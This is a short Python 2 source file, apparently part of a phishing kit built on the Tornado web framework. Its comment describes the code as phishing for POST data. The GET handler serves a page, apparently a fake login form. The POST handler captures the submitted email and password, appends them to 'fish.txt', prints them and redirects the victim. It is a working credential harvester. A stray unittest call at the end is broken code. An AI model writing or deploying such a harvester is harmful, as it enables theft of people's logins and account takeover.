#!/usr/bin/env python
#coding:utf-8
"""
  Author:  pirogue --<p1r06u3@gmail.com>
  Purpose: 
  Created: 2017/4/8
  Site:    http://pirogue.org
"""


import tornado.web
import json

########################################################################
class BaseHandler(tornado.web.RequestHandler):
    """ 基础类 """

    #----------------------------------------------------------------------
    def post(self):
        """ 钓鱼获取post数据 """
        email = self.get_arguments('email')
        passowrd = self.get_arguments('password')
        with open('fish.txt', 'a') as f:
            f.write('email:'+ str(email) + '|' + 'password:' + str(passowrd))
            print 'email:'+ str(email) + '|' + 'password:' + str(passowrd)
        return self.redirect('http://pirogue.org')
    
    def get(self):
        return self.render('index.html')


if __name__ == '__main__':
    unittest.main()